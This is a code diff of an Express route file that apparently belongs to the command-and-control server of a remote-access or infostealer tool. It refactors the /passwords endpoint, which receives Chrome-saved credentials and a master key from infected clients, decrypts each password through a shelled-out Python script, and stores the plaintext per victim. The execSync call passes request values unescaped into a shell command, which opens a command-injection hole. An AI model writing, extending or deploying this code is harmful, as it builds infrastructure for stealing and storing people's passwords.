@@ -3,11 +3,12 @@ const Response = require('../responses.model');
 const psResponse = require('../psResponse.model');
 const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
 const {GenerateRandomId} = require("../../Utils/utilFunctions");
-const {execSync} = require('child_process');
 const Utils = require("../../Utils/utilFunctions");
 const Client = require('../../Clients/client.model');
 const Command = require("../../Commands/commands.model");
 const path = require("path");
+const child_process = require("child_process");
+const appDir = path.dirname(require.main.filename);
 
 //Validate cookie for incoming requests
 router.use(toolCookieValidator);
@@ -77,48 +78,53 @@ router.route('/checkout').get((req, res) => {
     res.send();
 })
 
+
+function generatePasswordData(data, masterKey) {
+    let buffer = ""
+    for(let object in data){
+        let url = data[object][0]['url']
+        let username = data[object][1]['username']
+        let password = data[object][2]['password']
+        if(url && username  && password ){
+            buffer += `[+] Url: ${url}\n`
+            buffer += `[+] Username: ${username}\n`
+            let decryptedPass = child_process.execSync(`python ${appDir}\\scripts\\decrypt.py ${password} ${masterKey}`)
+            buffer += `[+] Password: ${decryptedPass}\n`
+        }
+    }
+    return buffer
+}
+
+//chrome passwords handle
 router.post("/passwords", function (req, res) {
-    let buffer = "";
     let clientId = req.headers['clientid'];
     try {
-        let appDir = path.dirname(require.main.filename);
         let data = req.body;
         let masterKey = req.body['masterKey'];
-        buffer = "Web credentials from client:\n";
-        for (let object in data) {
-            let url = data[object][0]['url'];
-            if (url === undefined)
-                break;
-            let username = data[object][1]['username'];
-            let password = data[object][2]['password'];
-            buffer += "\t[*] Url : " + url + "\n";
-            buffer += "\t[*] Username : " + username + "\n";
-            const passwordUnparsed = execSync(`${appDir}\\scripts\\decryptPassword.py ${password} ${masterKey}`, {
-                encoding: 'utf8',
-                timeout: 50000
+        if(data){
+            let buffer = generatePasswordData(data, masterKey)
+            const newResponse = new Response({
+                response_id: GenerateRandomId(6),
+                client_id: clientId,
+                response: buffer,
+                date: Utils.GetCurrentTimeDate()
             });
-            let decPassword = passwordUnparsed.replace(/^\s*[\r\n]/gm, '');
-            buffer += "\t[*] Password: " + decPassword + "\n";
+            newResponse.save()
+                .then(() => res.send())
+                .catch(err => {
+                    Utils.LogToFile(`Error adding passwords response: ${err.message}`)
+                    res.sendStatus(403)
+                })
+            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
+                function (err) {
+                    if (err)
+                        Utils.LogToFile(`Error updating last active for client ${clientId}`);
+                })
         }
-        const currentTimeDate = Utils.GetCurrentTimeDate();
-        const newResponse = new Response({
-            response_id: response_id,
-            client_id: clientId,
-            response: buffer,
-            date: currentTimeDate
-        });
-        newResponse.save()
-            .then(() => res.send('Response added successfully!'))
-            .catch(err => res.status(400).send(`Error adding response ${err}`));
-        Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
-            function (err) {
-                if (err)
-                    Utils.LogToFile(`Error updating last active for client ${clientId}`);
-            })
     } catch (err) {
         Utils.LogToFile(`Error getting data from passwords request ${err}`);
+        res.sendStatus(500)
     }
-    res.send('Done');
 });
 
 module.exports = router;
